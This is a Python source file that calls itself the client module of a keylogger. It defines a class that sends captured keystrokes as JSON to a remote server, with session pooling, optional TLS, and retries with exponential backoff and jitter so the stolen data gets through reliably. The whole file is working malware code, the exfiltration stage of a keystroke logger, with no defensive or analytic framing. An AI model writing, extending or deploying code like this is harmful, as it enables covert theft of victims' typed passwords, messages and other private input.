"""
Client module for the keylogger.
Handles HTTP communication with retry logic and exponential backoff.
"""

import json
import time
import logging
from typing import Optional

import requests

from .config import KeyloggerConfig


class KeyloggerClient:
    """HTTP client with retry logic and exponential backoff."""

    def __init__(self, config: KeyloggerConfig, logger: logging.Logger) -> None:
        self.config = config
        self.logger = logger
        self.session = requests.Session()
        self.ssl_context = config.get_ssl_context()

        # Configure session
        adapter = requests.adapters.HTTPAdapter(
            max_retries=0,  # We handle retries manually
            pool_connections=1,
            pool_maxsize=1,
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    def send(self, data: str) -> bool:
        """Send data with retry logic and exponential backoff."""
        if not data:
            return True

        payload = json.dumps({"keyboardData": data})
        headers = {"Content-Type": "application/json"}

        backoff = self.config.base_backoff

        for attempt in range(self.config.max_retries + 1):
            try:
                self.logger.debug(
                    f"Sending data (attempt {attempt + 1}/{self.config.max_retries + 1})"
                )

                response = self.session.post(
                    self.config.base_url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=self.ssl_context if self.config.use_tls else True,
                )

                if response.status_code == 200:
                    self.logger.debug("Data sent successfully")
                    return True
                elif response.status_code >= 500:
                    self.logger.warning(f"Server error: {response.status_code}")
                else:
                    self.logger.error(
                        f"Client error: {response.status_code} - {response.text}"
                    )
                    return False  # Don't retry client errors

            except requests.exceptions.SSLError as e:
                self.logger.error(f"SSL error: {e}")
                return False  # Don't retry SSL errors
            except requests.exceptions.ConnectionError as e:
                self.logger.warning(f"Connection error (attempt {attempt + 1}): {e}")
            except requests.exceptions.Timeout as e:
                self.logger.warning(f"Timeout (attempt {attempt + 1}): {e}")
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Request error: {e}")
                return False

            # Exponential backoff with jitter
            if attempt < self.config.max_retries:
                jitter = backoff * 0.1 * (2 * time.time() % 1)  # 0-10% jitter
                sleep_time = min(backoff + jitter, self.config.max_backoff)
                self.logger.info(f"Retrying in {sleep_time:.1f}s...")
                time.sleep(sleep_time)
                backoff = min(backoff * 2, self.config.max_backoff)

        self.logger.error(
            f"Failed to send data after {self.config.max_retries + 1} attempts"
        )
        return False

    def close(self) -> None:
        """Close the session."""
        self.session.close()